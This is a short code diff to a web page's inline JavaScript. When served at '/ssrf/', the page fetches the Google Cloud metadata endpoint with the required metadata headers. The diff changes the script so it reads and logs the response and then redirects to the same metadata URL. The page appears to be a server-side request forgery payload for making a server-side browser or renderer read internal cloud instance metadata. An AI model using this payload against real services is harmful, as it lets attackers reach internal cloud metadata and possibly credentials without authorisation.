@@ -11,17 +11,19 @@
         document.addEventListener('DOMContentLoaded', (event) => {
             if (window.location.pathname === '/ssrf/') {
                 fetch('http://metadata/computeMetadata/v1/instance/id', {
-                    method: 'GET',
-                    headers: {
-                        'Metadata-Flavor': 'Google',
-                        'X-Google-Metadata-Request': 'True'
-                    }
-                })
-                .then(response => {
-                    // Handle the response if needed
-                    window.location.href = 'http://metadata/computeMetadata/v1/instance/id'; // Redirect
-                })
-                .catch(error => console.error('Error:', error));
+    method: 'GET',
+    headers: {
+        'Metadata-Flavor': 'Google',
+        'X-Google-Metadata-Request': 'True'
+    }
+})
+.then(response => response.text()) // or response.json() if JSON response
+.then(data => {
+    console.log(data); // Process the response data
+    window.location.href = 'http://metadata/computeMetadata/v1/instance/id'; // Then redirect
+})
+.catch(error => console.error('Error:', error));
+
             }
         });
     </script>
